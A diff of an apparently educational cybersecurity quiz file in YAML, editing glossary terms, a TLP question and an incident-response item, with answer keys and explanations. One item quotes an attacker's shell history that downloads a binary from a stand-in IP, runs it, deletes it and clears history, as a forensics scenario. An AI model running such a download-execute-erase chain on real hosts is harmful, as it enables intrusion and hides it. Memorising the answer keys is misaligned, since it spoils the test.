@@ -260,10 +260,6 @@ units:
          def: "Threat information available only through a paid subscription, a vendor's private research or a members-only community, rather than to the public."}
       - {id: cy-1y-tlp, type: concept, term: "Traffic Light Protocol (TLP)",
          def: "A set of colour labels placed on shared intelligence that tells recipients how widely they may pass it on."}
-      - {id: cy-1y-honeypot, type: concept, term: "Honeypot",
-         def: "A decoy system set up to look like a real, valuable server, so that anyone who connects to it reveals themselves and their methods."}
-      - {id: cy-1y-honeytoken, type: concept, term: "Honeytoken",
-         def: "A fake credential, record, file or key planted among real data, whose use or access raises an alert because nothing legitimate ever touches it."}
       - {id: cy-1y-q01, type: mcq,
          q: "A defence contractor finds an intruder who has been inside for 14 months, used malware written only for this target, moved slowly between engineering servers and taken only design documents. No ransom was demanded. Which actor type BEST fits?",
          choices: ["Hacktivist", "Opportunistic cybercriminal", "Unintentional insider", "Advanced persistent threat"],
@@ -301,7 +297,7 @@ units:
          why: "Access restricted to paying customers makes it closed-source. Internal intelligence comes from the organization's own telemetry and incidents."}
       - {id: cy-1y-q08, type: mcq,
          q: "A report from a sector partner is marked TLP:AMBER+STRICT. The SOC wants to pass it to the managed service provider that runs its firewalls. What does the label allow?",
-         choices: ["Sharing with the provider, as a client relationship", "Sharing with anyone in the same sector", "Publishing a summary on the company blog", "Sharing only inside the SOC's own organization"],
+         choices: ["Sharing with the provider, because it works for the organization", "Sharing with anyone in the same sector", "Publishing a summary on the company blog", "Sharing only inside the SOC's own organization"],
          answer: 3,
          why: "AMBER+STRICT limits the report to the recipient's organization. Plain TLP:AMBER would also allow the organization's clients on a need-to-know basis, and GREEN allows the wider community."}
       - {id: cy-1y-q09, type: mcq,
@@ -464,8 +460,8 @@ units:
          answer: 0,
          why: "w3wp.exe is the IIS worker process; when it starts a shell running reconnaissance commands, something uploaded to the site is executing input from a remote user. An administrator's commands would come from their own session, not the web worker."}
       - {id: cy-1z2-q12, type: mcq, best: true,
-         q: "A Linux host's shell history: wget http://203.0.113.4/k -O /tmp/.k; chmod +x /tmp/.k; /tmp/.k & ; rm /tmp/.k; history -c. ps still shows a process running as /tmp/.k (deleted). The host has been isolated. What should the analyst collect FIRST?",
-         choices: ["A full disk image", "The /var/log directory", "A hash of every file in /tmp", "Memory and a copy of the running binary from /proc/<pid>/exe"],
+         q: "A Linux host's shell history: wget http://203.0.113.4/k -O /tmp/.k; chmod +x /tmp/.k; /tmp/.k & rm /tmp/.k; history -c. The process is still running, and ls -l /proc/4242/exe shows /tmp/.k (deleted). The host has been isolated. What should the analyst collect FIRST?",
+         choices: ["A full disk image", "The /var/log directory", "A hash of every file in /tmp", "Memory and a copy of the running binary from /proc/4242/exe"],
          answer: 3,
          why: "The binary is gone from disk but still running, so it exists only in memory, which is the most volatile evidence. On Linux it can be recovered through /proc while the process lives.",
          whys: ["Needed, but the file was deleted from disk and the disk image will not hold the running payload reliably.", "Useful, but logs are far less volatile than the running process.", "/tmp no longer holds the file, so this finds nothing about the payload.", "Best: captures the volatile payload before a reboot or crash loses it for good."]}
